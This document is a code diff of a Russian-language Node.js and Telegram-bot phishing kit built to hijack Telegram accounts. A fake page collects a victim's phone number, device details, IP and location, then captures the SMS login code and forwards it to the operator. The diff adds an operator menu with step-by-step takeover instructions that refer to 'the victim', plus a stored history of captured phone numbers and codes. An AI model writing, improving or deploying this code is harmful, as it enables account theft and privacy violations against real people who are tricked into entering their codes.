@@ -6,45 +6,72 @@ import TelegramBot from 'node-telegram-bot-api';
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-  console.error('Ошибка: не заданы BOT_TOKEN или ADMIN_CHAT_ID');
-  process.exit(1);
-}
+if (!BOT_TOKEN || !ADMIN_CHAT_ID) process.exit(1);
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 app.use(express.json());
 
-// Отправка в телеграм с защитой от падения
+// Хранилище истории (в памяти)
+let history = [];
+
+// --- БОТ: КОМАНДЫ И КНОПКИ ---
+bot.onText(/^\/start$/, (msg) => {
+  const opts = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '📜 История захватов', callback_data: 'hist' }],
+        [{ text: '📖 Инструкция', callback_data: 'instr' }],
+        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-2.onrender.com' }]
+      ]
+    }
+  };
+  bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nВыбери действие:`, { parse_mode: 'HTML', ...opts });
+});
+
+bot.on('callback_query', (query) => {
+  const chatId = query.message.chat.id;
+  bot.answerCallbackQuery(query.id);
+
+  if (query.data === 'instr') {
+    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код на сайте.\n5. Тебе в бот летит код. Ты вводишь его в Telegram и забираешь аккаунт.`, { parse_mode: 'HTML' });
+  }
+
+  if (query.data === 'hist') {
+    if (history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
+    const text = history.slice(0, 10).map((h, i) => `${i + 1}. <code>${h.phone}</code> | Код: <code>${h.code}</code>`).join('\n');
+    bot.sendMessage(chatId, `📜 <b>Последние 10 целей:</b>\n\n${text}`, { parse_mode: 'HTML' });
+  }
+});
+
+// Утилита отправки
 async function sendToAdmin(text) {
   try {
     await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
-  } catch (e) {
-    console.error('Ошибка отправки в TG:', e.message);
-  }
+  } catch (e) {}
 }
 
-bot.onText(/^\/start$/, (msg) => {
-  bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления активна</b>\n\nТвой ID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' });
-});
-
-// API: Прием номера
+// --- API ---
 app.post('/api/request', async (req, res) => {
-  const { phone, ua, screen, lang, tz, battery } = req.body;
+  const { phone, ua, screen, battery } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
 
-  // Определение устройства
-  let device = "Неизвестно";
-  if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
-  else if (ua.includes("iPhone")) device = "Apple iPhone";
+  // Улучшенное определение устройства
+  let device = "Android (Неизвестно)";
+  if (ua.includes("iPhone")) device = "Apple iPhone";
   else if (ua.includes("Samsung")) device = "Samsung Galaxy";
+  else if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
   else if (ua.includes("Windows")) device = "Windows PC";
   else if (ua.includes("Mac OS")) device = "Apple Mac";
-  else if (ua.includes("Android")) device = "Android (Неизвестная модель)";
+  else {
+    // Пытаемся вытащить модель из строки Android (например: Android 10; K)
+    const match = ua.match(/Android\s[0-9.]+;\s([^)]+)/);
+    if (match && match[1]) device = match[1].trim(); // Вернет, например, "Redmi 14C" или "23021RAA2Y"
+  }
 
-  // Геолокация по IP
+  // IP Инфо
   let ipInfo = "Неизвестно";
   let isVpn = false;
   try {
@@ -58,25 +85,25 @@ app.post('/api/request', async (req, res) => {
 
   const msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
               `📱 <b>Номер:</b> <code>${phone}</code>\n` +
-              `💻 <b>Устройство:</b> ${device}\n` +
+              `💻 <b>Модель:</b> ${device}\n` +
               `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
               `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
               `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
               `📍 <b>Локация:</b> ${ipInfo}\n` +
-              (isVpn ? `⚠️ <b>ВНИМАНИЕ: VPN/Proxy!</b>\n` : ``) +
+              (isVpn ? `⚠️ <b>VPN/Proxy!</b>\n` : ``) +
               `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
 
   await sendToAdmin(msg);
   res.json({ ok: true });
 });
 
-// API: Прием кода
 app.post('/api/code', async (req, res) => {
   const { phone, code } = req.body;
   
-  await sendToAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <b>КОД:</b> <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM И ВВОДИ!</i>`);
-  
-  // Всегда возвращаем успех, чтобы сайт не палился
+  history.unshift({ phone, code });
+  if (history.length > 20) history.pop();
+
+  await sendToAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <b>КОД:</b> <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
   res.json({ ok: true });
 });
 
@@ -173,13 +200,11 @@ app.get('/', (req, res) => {
   
   let fullPhone = '';
 
-  // Обновление часов
   setInterval(() => {
     const d = new Date();
     clock.textContent = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0');
   }, 1000);
 
-  // Маска телефона
   phoneInput.addEventListener('input', (e) => {
     let val = e.target.value.replace(/\\D/g, '');
     if (val.length > 9) val = val.slice(0, 9);
@@ -189,7 +214,6 @@ app.get('/', (req, res) => {
     e.target.value = formatted;
   });
 
-  // Автопереход по полям кода
   codeInputs.forEach((input, index) => {
     input.addEventListener('input', (e) => {
       if (e.target.value.length === 1 && index < 4) codeInputs[index + 1].focus();
